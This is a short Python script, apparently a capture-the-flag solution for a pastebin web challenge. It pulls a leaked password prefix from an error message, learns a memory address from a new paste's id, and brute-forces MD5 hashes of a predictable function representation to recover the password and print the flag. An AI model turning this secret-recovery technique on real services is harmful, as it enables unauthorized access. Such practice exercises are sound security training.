import re
import hashlib
import requests

passwd = re.search(
    "Incorrect parameter &password=([0-9a-f]+)\.\.\.",
    requests.get("https://pastebin.web.actf.co/view?id=0").text,
).group(1)
print(f"password[:6]: {passwd}")


res = requests.post("https://pastebin.web.actf.co/paste", data={"content": "satoki"})
id_satoki = re.search("id=([0-9]+)", res.text).group(1)
print(f'id("satoki"): {hex(int(id_satoki))}')

for i in range(0x0, 0xFFFFFFF):
    base = int(id_satoki)& (~0xFFFFFFF)
    hash = hashlib.md5(
        f"password-<function token_hex at {hex(base + i)}>".encode()
    ).hexdigest()
    if hash.startswith(passwd):
        print(f"password?: {hash}")
        flag = requests.get(f"https://pastebin.web.actf.co/view?id=0&password={hash}").text
        if "actf{" in flag:
            print(f"password: {hash}")
            print(re.search("actf{.*}", flag).group(0))
            break
